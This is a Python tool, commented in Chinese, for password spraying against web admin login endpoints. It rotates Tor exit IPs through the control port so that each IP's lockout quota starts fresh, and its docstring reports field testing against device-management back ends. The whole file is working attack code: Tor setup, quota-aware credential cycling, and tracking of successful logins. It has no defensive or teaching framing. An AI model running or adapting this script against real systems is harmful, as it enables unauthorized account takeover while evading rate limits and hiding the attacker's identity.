#!/usr/bin/env python3
"""IP 限速登录喷洒器 —— 经 Tor 出口池轮换(每个出口 IP = 全新配额)。
实测于 2026-09「设备管理后台」类目标:每出口约 4 次有效校验,第 5 发直接返回锁定语。

用法:
  SPRAY_URL='http://TARGET/manage/auth/login' python3 tor_sprayer.py pool.json state.json

pool.json: {"pool": [["user","pass"], ...]}
state.json: 自动维护 {"tried": [...], "found": null, "log": [...], "batch": n}
环境变量(默认值适合 JSON {username,password} 登录形态):
  SPRAY_URL      登录接口
  SUCCESS_MARK   成功标记(默认 "code":0)
  LOCK_MARK      配额尽标记(默认 过多)
  QUOTA_MARK     剩余次数标记(默认 还可尝试)
  CHUNK          每出口候选数(默认 4)

前置:
  apt-get install -y tor
  printf 'ControlPort 9051\nCookieAuthentication 0\n' >> /etc/tor/torrc
  service tor restart
  验证: curl -s --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip

完成通知: 外层用哨兵循环 poll state.json 的 found 字段, 命中/退出时 notify。
"""
import json, os, subprocess, sys, time

URL = os.environ.get('SPRAY_URL', '')
POOL = sys.argv[1] if len(sys.argv) > 1 else 'pool.json'
STATE = sys.argv[2] if len(sys.argv) > 2 else 'state.json'
SUCCESS_MARK = os.environ.get('SUCCESS_MARK', '"code":0')
LOCK_MARK = os.environ.get('LOCK_MARK', '过多')
QUOTA_MARK = os.environ.get('QUOTA_MARK', '还可尝试')
CHUNK = int(os.environ.get('CHUNK', '4'))

assert URL, 'set SPRAY_URL env'


def newnym():
    subprocess.run("printf 'AUTHENTICATE\\r\\nSIGNAL NEWNYM\\r\\nQUIT\\r\\n' | nc 127.0.0.1 9051",
                   shell=True, capture_output=True, timeout=10)
    time.sleep(4)  # 等新 circuit 就绪


def attempt(user, pwd):
    # 按目标改 body/headers; 这里是 JSON {username,password} 形态
    body = json.dumps({"username": user, "password": pwd})
    cmd = ['curl', '-s', '--socks5-hostname', '127.0.0.1:9050', '-m', '50', URL, '-X', 'POST',
           '-H', 'Content-Type: application/json', '-H', 'User-Agent: Mozilla/5.0', '-d', body]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=70)
        return r.stdout.strip() or ('ERR:' + (r.stderr.strip()[:80] or 'empty'))
    except Exception as e:
        return 'ERR:' + str(e)[:80]


def save(st):
    json.dump(st, open(STATE, 'w'), indent=1)


def main():
    pool = json.load(open(POOL))['pool']
    st = json.load(open(STATE)) if os.path.exists(STATE) else {"tried": [], "found": None, "log": [], "batch": 0}
    if st.get('found'):
        print('already found:', st['found'])
        return
    streak = 0
    while True:
        pending = [c for c in pool if f"{c[0]}|{c[1]}" not in st['tried']]
        if not pending:
            print('DONE: pool exhausted')
            return
        st['batch'] += 1
        newnym()
        for u, p in pending[:CHUNK]:
            resp = attempt(u, p)
            st['log'].append({"u": u, "p": p, "resp": resp[:160], "t": time.time()})
            print(f"[b{st['batch']}] {u}/{p} -> {resp[:110]}", flush=True)
            if SUCCESS_MARK in resp:
                st['tried'].append(f"{u}|{p}")
                st['found'] = {"u": u, "p": p, "resp": resp}
                save(st)
                print('!!! FOUND !!!', flush=True)
                return
            if LOCK_MARK in resp and QUOTA_MARK not in resp:
                # 本出口配额尽: 当前候选保持未试, 换出口重排
                streak += 1
                print(f"  quota out (streak {streak})", flush=True)
                if streak >= 3:
                    time.sleep(60)
                    streak = 0
                break
            if resp.startswith('ERR:'):
                # 网络错误(可能未送达): 不标记 tried, 下一轮重试
                print('  network err, retry next round', flush=True)
                break
            streak = 0
            st['tried'].append(f"{u}|{p}")
            save(st)
            time.sleep(1.0)


if __name__ == '__main__':
    main()
